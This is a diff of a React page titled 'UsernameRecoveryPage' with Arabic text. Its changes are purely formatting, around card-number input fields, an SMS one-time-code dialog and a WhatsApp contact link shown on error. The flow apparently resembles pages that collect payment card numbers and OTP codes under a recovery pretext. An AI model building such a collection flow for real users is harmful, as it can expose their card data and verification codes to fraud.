@@ -237,9 +237,8 @@ export default function UsernameRecoveryPage() {
                     ref={(el) => (cardInputRefs.current[index] = el) as any}
                     value={number}
                     onChange={(e) => handlecnChange(index, e.target.value)}
-                    className={`text-center border-0 border-b-2 rounded-none ${
-                      errors[`card-${index}`] ? "border-red-500" : ""
-                    }`}
+                    className={`text-center border-0 border-b-2 rounded-none ${errors[`card-${index}`] ? "border-red-500" : ""
+                      }`}
                     placeholder="XXXX"
                     maxLength={4}
                     required
@@ -352,7 +351,7 @@ export default function UsernameRecoveryPage() {
 
       <Dialog open={showOtp} onOpenChange={handleCloseOtp}>
         <DialogContent className="sm:max-w-md">
-        {!otpError&&    <DialogHeader>
+          {!otpError && <DialogHeader>
             <DialogTitle className="text-right">رمز التحقق</DialogTitle>
             <Button variant="ghost" size="icon" className="absolute left-4 top-4" onClick={handleCloseOtp}>
               <X className="h-4 w-4" />
@@ -360,22 +359,22 @@ export default function UsernameRecoveryPage() {
           </DialogHeader>}
 
           <div className="space-y-4">
-          {!otpError&&
-          <>
-           <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>
+            {!otpError &&
+              <>
+                <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>
 
-            <div className="flex justify-center gap-3">
-           <Input
-                value={otpValues}
-                onChange={(e) => handleOtpChange(e.target.value)}
-                className="w-full h-12 text-center text-lg font-bold"
-                maxLength={5}
-                type="text"
-                inputMode="numeric"
-              />
-            </div>
-            </>    
-          }
+                <div className="flex justify-center gap-3">
+                  <Input
+                    value={otpValues}
+                    onChange={(e) => handleOtpChange(e.target.value)}
+                    className="w-full h-12 text-center text-lg font-bold"
+                    maxLength={5}
+                    type="text"
+                    inputMode="numeric"
+                  />
+                </div>
+              </>
+            }
             {otpError && (
               <div className="text-red-500 text-sm text-right bg-red-50 p-3 rounded-lg border border-red-200 space-y-3">
                 <p>{otpError}</p>
@@ -385,18 +384,18 @@ export default function UsernameRecoveryPage() {
                   rel="noopener noreferrer"
                   className="flex justify-between text-right text-blue-600 hover:text-blue-800 underline font-semibold"
                 >
-                <img src="/whatsapp.png" alt="" width={25}/> 
-    <span>            اضغط هنا للتواصل</span>
+                  <img src="/whatsapp.png" alt="" width={25} />
+                  <span>            اضغط هنا للتواصل</span>
                 </a>
               </div>
             )}
 
-         { !otpError&&   <Button
+            {!otpError && <Button
               onClick={handleContinue}
               className="w-full bg-[#3111f3] hover:bg-blue-600 text-white py-4 rounded-full text-lg"
             >
               تأكيد
-            </Button> }
+            </Button>}
           </div>
         </DialogContent>
       </Dialog>
